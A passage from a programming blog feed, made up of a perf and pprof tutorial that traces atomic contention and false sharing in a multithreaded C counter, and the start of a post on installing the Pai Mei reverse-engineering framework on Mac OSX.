&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;%&lt;/span&gt; perf
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;to see a list of the commands (you might want to look into &lt;code&gt;perf record&lt;/code&gt; and &lt;code&gt;perf annotate&lt;/code&gt;). &lt;/p&gt;
&lt;p&gt;For an example of this being used in real life, see this excellent analysis of  &lt;a href="http://thread.gmane.org/gmane.comp.version-control.git/172286"&gt;this analysis of a string comparison bottleneck in &lt;code&gt;git gc&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;Our Investigation&lt;/h2&gt;
&lt;p&gt;We compile the program with &lt;code&gt;-lprofiler&lt;/code&gt; so we can generate output to examine. &lt;code&gt;try_perf.c&lt;/code&gt; is a C program that counts the number of even values
in an array of random numbers. We run with 8 threads that all increment a global
counter every time they see an even number.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;%&lt;/span&gt; gcc try_perf.c -g -lprofiler -lpthread
&lt;span class="gp"&gt;%&lt;/span&gt; &lt;span class="nv"&gt;CPUPROFILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;a.out.prof ./a.out --num_threads&lt;span class="o"&gt;=&lt;/span&gt;8
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We run pprof and get the source code annotated with the number of probes that 
hit that instruction during the trace (result below trimmed for brevity).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;%&lt;/span&gt; pprof --list&lt;span class="o"&gt;=&lt;/span&gt;thread_scan a.out a.out.prof
&lt;span class="go"&gt; ... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;span class="go"&gt;   .      .   60: void* thread_scan(void* void_arg) {&lt;/span&gt;
&lt;span class="go"&gt;   .      .   61:    // TODO(awreece) Copy locally so dont interfere with each other.&lt;/span&gt;
&lt;span class="go"&gt;   .      .   62:  thread_arg_t* args = (thread_arg_t*) void_arg;&lt;/span&gt;
&lt;span class="go"&gt;   .      .   63:  size_t i;&lt;/span&gt;
&lt;span class="go"&gt;   .      .   64: &lt;/span&gt;
&lt;span class="go"&gt; 303    323   65:  for (i = 0; i &amp;lt; arg-&amp;gt;size; i++) {&lt;/span&gt;
&lt;span class="go"&gt;   6     10   66:     uint32_t val = arg-&amp;gt;input[i];&lt;/span&gt;
&lt;span class="go"&gt;   6     15   67:   if (val % 2 == 0) {&lt;/span&gt;
&lt;span class="go"&gt;   9    300   68:     __sync_fetch_and_add(args-&amp;gt;evens, 1);&lt;/span&gt;
&lt;span class="go"&gt;   .      .   69:   }&lt;/span&gt;
&lt;span class="go"&gt;   .      .   70:  }&lt;/span&gt;
&lt;span class="go"&gt;   .      .   71: }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The output above is actually misleading: if you look at the assembly (shown below), the instruction immediately after the atomic instruction (the &lt;code&gt;addq   $0x1,-0x8(%rbp)&lt;/code&gt; after the &lt;code&gt;lock addq $0x1,(%rax)&lt;/code&gt;) gets excess hits that count towards the for loop when they should probably count towards the atomic instruction.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;%&lt;/span&gt; pprof --disas&lt;span class="o"&gt;=&lt;/span&gt;thread_scan a.out a.out.prof
&lt;span class="go"&gt; ... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;span class="go"&gt;  9    300    68: __sync_fetch_and_add(arg-&amp;gt;num_evens, 1);&lt;/span&gt;
&lt;span class="go"&gt;  4      5      4008a4: mov    -0x10(%rbp),%rax&lt;/span&gt;
&lt;span class="go"&gt;  1      5      4008a8: mov    0x10(%rax),%rax&lt;/span&gt;
&lt;span class="go"&gt;  4    290      4008ac: lock addq $0x1,(%rax)&lt;/span&gt;
&lt;span class="go"&gt;303    320    65: for (i = 0; i &amp;lt; arg-&amp;gt;size; i++) {&lt;/span&gt;
&lt;span class="go"&gt;286    287      4008b1: addq   $0x1,-0x8(%rbp)&lt;/span&gt;
&lt;span class="go"&gt;  1      2      4008b6: mov    -0x10(%rbp),%rax&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Hrm. Why are we spending a lot of time in &lt;code&gt;lock addq $0x1,(%rax)&lt;/code&gt;?&lt;/p&gt;
&lt;p&gt;To understand this, we will use &lt;code&gt;perf&lt;/code&gt;. Run: &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;%&lt;/span&gt; perf stat ./a.out
&lt;span class="go"&gt; Performance counter stats for &amp;#39;./a.out&amp;#39;:&lt;/span&gt;

&lt;span class="go"&gt;    5793.307952 task-clock                #    2.157 CPUs utilized          &lt;/span&gt;
&lt;span class="go"&gt;            589 context-switches          #    0.000 M/sec                  &lt;/span&gt;
&lt;span class="go"&gt;             11 CPU-migrations            #    0.000 M/sec                  &lt;/span&gt;
&lt;span class="go"&gt;          1,974 page-faults               #    0.000 M/sec                  &lt;/span&gt;
&lt;span class="go"&gt; 16,378,904,731 cycles                    #    2.827 GHz                     [83.37%]&lt;/span&gt;
&lt;span class="go"&gt; 10,407,719,950 stalled-cycles-frontend   #   63.54% frontend cycles idle    [83.38%]&lt;/span&gt;
&lt;span class="go"&gt;  8,213,634,448 stalled-cycles-backend    #   50.15% backend  cycles idle    [66.65%]&lt;/span&gt;
&lt;span class="go"&gt; 12,070,323,273 instructions              #    0.74  insns per cycle        &lt;/span&gt;
&lt;span class="gp"&gt;                                          #&lt;/span&gt;    0.86  stalled cycles per insn &lt;span class="o"&gt;[&lt;/span&gt;83.32%&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="go"&gt;  2,428,236,441 branches                  #  419.145 M/sec                   [83.31%]&lt;/span&gt;
&lt;span class="go"&gt;     67,558,697 branch-misses             #    2.78% of all branches         [83.35%]&lt;/span&gt;

&lt;span class="go"&gt;    2.685598183 seconds time elapsed&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Wow, thats a lot of stalled instructions! The 8 threads are sharing the same counter, generating a lot of memory traffic. We modify the program so they all use their own counter, and then we aggregate at the end (if we do this, we don't need to use the atomic instruction).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;counts&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;nthreads&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;num_evens&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;nthreads&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
     &lt;span class="n"&gt;counts&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
     &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="n"&gt;num_evens&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;counts&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
     &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="n"&gt;input&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;inarray&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="n"&gt;nthreads&lt;/span&gt;&lt;span class="p"&gt;)];&lt;/span&gt;
     &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="n"&gt;nthreads&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
     &lt;span class="n"&gt;pthread_create&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;threads&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;thread_scan&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
 &lt;span class="p"&gt;}&lt;/span&gt;   
 &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;nthreads&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
     &lt;span class="n"&gt;pthread_join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;threads&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
     &lt;span class="n"&gt;num_evens&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;counts&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
 &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;But that didn't seem to help at all! We still spend most of our time on the increment, even though we aren't using an atomic instruction: &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;%&lt;/span&gt; pprof --list&lt;span class="o"&gt;=&lt;/span&gt;thread_scan a.out out.prof
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;span class="go"&gt;  .      .   60: void* thread_scan(void* void_arg) {&lt;/span&gt;
&lt;span class="go"&gt;  .      .   61:    // TODO(awreece) Copy locally so dont interfere with each other.&lt;/span&gt;
&lt;span class="go"&gt;  .      .   62:  thread_arg_t* args = (thread_arg_t*) void_arg;&lt;/span&gt;
&lt;span class="go"&gt;  .      .   63:  size_t i;&lt;/span&gt;
&lt;span class="go"&gt;  .      .   64: &lt;/span&gt;
&lt;span class="go"&gt; 22     44   65:  for (i = 0; i &amp;lt; args-&amp;gt;size; i++) {&lt;/span&gt;
&lt;span class="go"&gt; 14     25   66:     uint32_t val = args-&amp;gt;input[i];&lt;/span&gt;
&lt;span class="go"&gt; 12     33   67:   if (val % 2 == 0) {&lt;/span&gt;
&lt;span class="go"&gt;157    308   68:    *(args-&amp;gt;num_evens) += 1;&lt;/span&gt;
&lt;span class="go"&gt;  .      .   69:   }&lt;/span&gt;
&lt;span class="go"&gt;  .      .   70:  }&lt;/span&gt;
&lt;span class="go"&gt;  .      .   71: }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Why could this be? Lets run &lt;code&gt;perf stat&lt;/code&gt; again and see:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;%&lt;/span&gt; perf stat ./a.out
&lt;span class="go"&gt; Performance counter stats for &amp;#39;./a.out&amp;#39;:&lt;/span&gt;

&lt;span class="go"&gt;      4372.474270 task-clock                #    1.882 CPUs utilized          &lt;/span&gt;
&lt;span class="go"&gt;              385 context-switches          #    0.000 M/sec                  &lt;/span&gt;
&lt;span class="go"&gt;                9 CPU-migrations            #    0.000 M/sec                  &lt;/span&gt;
&lt;span class="go"&gt;            1,135 page-faults               #    0.000 M/sec                  &lt;/span&gt;
&lt;span class="go"&gt;   12,411,517,583 cycles                    #    2.839 GHz                     [83.26%]&lt;/span&gt;
&lt;span class="go"&gt;    6,270,257,100 stalled-cycles-frontend   #   50.52% frontend cycles idle    [83.33%]&lt;/span&gt;
&lt;span class="go"&gt;    4,291,405,838 stalled-cycles-backend    #   34.58% backend  cycles idle    [66.78%]&lt;/span&gt;
&lt;span class="go"&gt;   12,306,996,386 instructions              #    0.99  insns per cycle        &lt;/span&gt;
&lt;span class="gp"&gt;                                            #&lt;/span&gt;    0.51  stalled cycles per insn &lt;span class="o"&gt;[&lt;/span&gt;83.39%&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="go"&gt;    2,420,224,187 branches                  #  553.514 M/sec                   [83.40%]&lt;/span&gt;
&lt;span class="go"&gt;       69,182,448 branch-misses             #    2.86% of all branches         [83.30%]&lt;/span&gt;

&lt;span class="go"&gt;      2.323372370 seconds time elapsed&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;What is going on now? We &lt;em&gt;still&lt;/em&gt; have a lot of stalled instructions, but all those counters are different. See?&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;counts&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;nthreads&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Oh, they are all on the same cache line - we're experiencing false sharing. Let us use a thread local counter thats on a different cache line for each thread:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="nf"&gt;thread_scan&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;void_arg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;thread_arg_t&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;thread_arg_t&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;void_arg&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;num_evens&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;uint32_t&lt;/span&gt; &lt;span class="n"&gt;val&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;input&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;val&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;num_evens&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;num_evens&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="p"&gt;...&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;snip&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;...&lt;/span&gt;

&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;nthreads&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;pthread_join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;threads&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;num_evens&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And then look at the profile:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;%&lt;/span&gt; pprof --list&lt;span class="o"&gt;=&lt;/span&gt;thread_scan a.out out.prof
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;span class="go"&gt;  .      .   60: void* thread_scan(void* void_arg) {&lt;/span&gt;
&lt;span class="go"&gt;  .      .   61:    // TODO(awreece) Copy locally so dont interfere with each other.&lt;/span&gt;
&lt;span class="go"&gt;  .      .   62:  thread_arg_t* args = (thread_arg_t*) void_arg;&lt;/span&gt;
&lt;span class="go"&gt;  .      .   63:  size_t i;&lt;/span&gt;
&lt;span class="go"&gt;  .      .   64:  size_t num_evens;&lt;/span&gt;
&lt;span class="go"&gt;  .      .   65: &lt;/span&gt;
&lt;span class="go"&gt;144    292   66:  for (i = 0; i &amp;lt; args-&amp;gt;size; i++) {&lt;/span&gt;
&lt;span class="go"&gt; 14     25   67:     uint32_t val = args-&amp;gt;input[i];&lt;/span&gt;
&lt;span class="go"&gt; 12     33   68:   if (val % 2 == 0) {&lt;/span&gt;
&lt;span class="go"&gt; 13     16   69:    num_evens++;&lt;/span&gt;
&lt;span class="go"&gt;  .      .   70:   }&lt;/span&gt;
&lt;span class="go"&gt;  .      .   71:  }&lt;/span&gt;
&lt;span class="go"&gt;  4      8   72:  return num_evens;&lt;/span&gt;
&lt;span class="go"&gt;  .      .   73: }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Good, our increment doesn't dominate the function anymore. We look at &lt;code&gt;perf stat&lt;/code&gt; and see:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;%&lt;/span&gt; perf stat ./a.out
&lt;span class="go"&gt; Performance counter stats for &amp;#39;./a.out&amp;#39;:&lt;/span&gt;

&lt;span class="go"&gt;    2977.781539 task-clock                #    1.472 CPUs utilized          &lt;/span&gt;
&lt;span class="go"&gt;            177 context-switches          #    0.000 M/sec                  &lt;/span&gt;
&lt;span class="go"&gt;             12 CPU-migrations            #    0.000 M/sec                  &lt;/span&gt;
&lt;span class="go"&gt;          3,506 page-faults               #    0.001 M/sec                  &lt;/span&gt;
&lt;span class="go"&gt;  8,523,367,658 cycles                    #    2.862 GHz                     [83.32%]&lt;/span&gt;
&lt;span class="go"&gt;  2,057,253,537 stalled-cycles-frontend   #   24.14% frontend cycles idle    [83.26%]&lt;/span&gt;
&lt;span class="go"&gt;    919,272,160 stalled-cycles-backend    #   10.79% backend  cycles idle    [66.70%]&lt;/span&gt;
&lt;span class="go"&gt; 12,067,358,492 instructions              #    1.42  insns per cycle        &lt;/span&gt;
&lt;span class="gp"&gt;                                          #&lt;/span&gt;    0.17  stalled cycles per insn &lt;span class="o"&gt;[&lt;/span&gt;83.42%&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="go"&gt;  2,454,951,795 branches                  #  824.423 M/sec                   [83.42%]&lt;/span&gt;
&lt;span class="go"&gt;     67,544,262 branch-misses             #    2.75% of all branches         [83.42%]&lt;/span&gt;

&lt;span class="go"&gt;    2.022988074 seconds time elapsed&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ah, perfect! 30% faster than our original solution and significantly fewer stalled instructions.&lt;/p&gt;</content><category term="profiling"></category></entry><entry><title>Pai Mei on Mac OSX 10.8</title><link href="https://codearcana.com/posts/2012/10/28/pai-mei-on-mac-osx-108.html" rel="alternate"></link><published>2012-10-28T00:00:00-07:00</published><updated>2012-10-28T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2012-10-28:/posts/2012/10/28/pai-mei-on-mac-osx-108.html</id><summary type="html">&lt;p&gt;&lt;a href="https://github.com/OpenRCE/paimei"&gt;Pai Mei&lt;/a&gt; is an open source windows reverse engineering framework. At one point, it was ported to Mac OSX but the project is not very actively maintained and the current instructions are quite lacking. This post hopes to offer some guidance and reduce some of the frustration involved in installing …&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;a href="https://github.com/OpenRCE/paimei"&gt;Pai Mei&lt;/a&gt; is an open source windows reverse engineering framework. At one point, it was ported to Mac OSX but the project is not very actively maintained and the current instructions are quite lacking. This post hopes to offer some guidance and reduce some of the frustration involved in installing Pai Mei on Mac OSX.&lt;/p&gt;
&lt;h3&gt;Getting the libraries&lt;/h3&gt;

&lt;p&gt;The most difficult thing was finding how to get all the packages working. First and foremost, Pai Mei was designed for a 32 bit windows libary so some trickery is required to get it to work in 64 bit mode (which is necessary, because I could not get the latest &lt;tt&gt;wxPython&lt;/tt&gt; from Homebrew to work in 32 bit mode). I did not realize at first that there was a way to use Pai Mei in 64 bit mode, so I spent a long time attempting to find universal binaries for wxPython and MySql.&lt;/p&gt;
&lt;p&gt;Pai Mei depends on a number of packages:
&lt;ul&gt;
    &lt;li&gt;&lt;tt&gt;mysql-python&lt;/tt&gt;: I installed via &lt;tt&gt;pip install mysql-python&lt;/tt&gt;.&lt;/li&gt;
    &lt;li&gt;&lt;tt&gt;pydasm&lt;/tt&gt;: I installed via &lt;tt&gt;pip install pydasm&lt;/tt&gt;.&lt;/li&gt;
        &lt;li&gt;&lt;tt&gt;ctypes&lt;/tt&gt;: I believe is included by default in Python 2.5 and higher.&lt;/li&gt;
        &lt;li&gt;&lt;tt&gt;MySql&lt;/tt&gt;: I installed via &lt;tt&gt;brew install mysql --universal&lt;/tt&gt; to have a universal binary (downloading from the MySql homepage means you will get a single architecture binary).&lt;/li&gt;
        &lt;li&gt;&lt;tt&gt;wxPython&lt;/tt&gt;: I installed via &lt;tt&gt;brew install wxmac --universal&lt;/tt&gt; and then manually symlinked it into correct location: &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;#&lt;/span&gt; ln -s /usr/local/Cellar/wxmac/2.9.4.0/lib/python2.7/site-packages/wx /Library/Python/2.7/site-packages/wx
&lt;span class="gp"&gt;#&lt;/span&gt; ln -s /usr/local/Cellar/wxmac/2.9.4.0/lib/python2.7/site-packages/wxPython-2.9.4.0-py2.7.egg-info /Library/Python/2.7/site-packages/wxPython-2.9.4.0-py2.7.egg-info
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;(I sincerely hope there is a better way, but I couldn't find one). Note: as of yet, I haven't found a way to get &lt;tt&gt;wxPython&lt;/tt&gt; to work in 32 bit python. I'll update the post when I figure that out.&lt;/li&gt;
&lt;/ul&gt;&lt;/p&gt;
&lt;h3&gt;Installing Pai Mei&lt;/h3&gt;

&lt;p&gt;Pai Mei uses the &lt;a href="https://github.com/OpenRCE/pydbg"&gt;pydbg&lt;/a&gt; library (I believe it is linked incorrectly in the repository as a git submodule). I strongly encourage you &lt;a href="https://github.com/gdbinit/pydbg64"&gt;this&lt;/a&gt; version of pydbg instead, which is a port to 64 Mac OSX by Charlie Miller and fG. Cloning the repository and installing via instructions in the &lt;tt&gt;MacOSX/README&lt;/tt&gt; worked fine for me. Warning: you can only use this library to debug a 32 bit process from 32 bit python and a 64 bit process from 64 bit python: to use 32 bit python, do: &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nv"&gt;VERSIONER_PYTHON_PREFER_32_BIT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;yes /usr/bin/python
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;After installing &lt;tt&gt;pydbg64&lt;/tt&gt;, I now had a directory tree that looked like:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;pydbg64/&lt;/span&gt;
&lt;span class="go"&gt;├── pydbg&lt;/span&gt;
&lt;span class="go"&gt;└── ...&lt;/span&gt;
&lt;span class="go"&gt;paimei/&lt;/span&gt;
